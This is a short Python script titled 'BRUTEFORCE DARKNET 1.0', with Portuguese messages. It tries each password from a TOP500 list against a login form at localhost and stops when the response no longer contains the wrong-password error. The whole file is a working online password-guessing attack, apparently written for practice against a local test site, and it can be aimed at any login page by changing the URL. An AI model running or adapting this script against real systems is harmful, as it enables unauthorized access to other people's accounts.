#!/usr/bin/python3

import requests
import os
import sys

os.system('clear')

with open('TOP500.txt') as file:
     senhas = file.readlines()

     print('=======================')
     print('BRUTEFORCE DARKNET 1.0')
     print('=======================')

     for i in senhas:
         senha = i.strip()

         payload = { "nome" : "imr code", "senha" : senha }
         url = 'http://localhost:8000/login.php'
         response =  requests.post(url,data=payload)

         if "Usuario ou senha errada!" not in response.text:
             print('\033[92m[+]-  SENHA QUEBRADA ==> ', senha,'\033[0m' )
             sys.exit()
         else:
             print('\033[91m[+]- ',senha,'\033[0m')
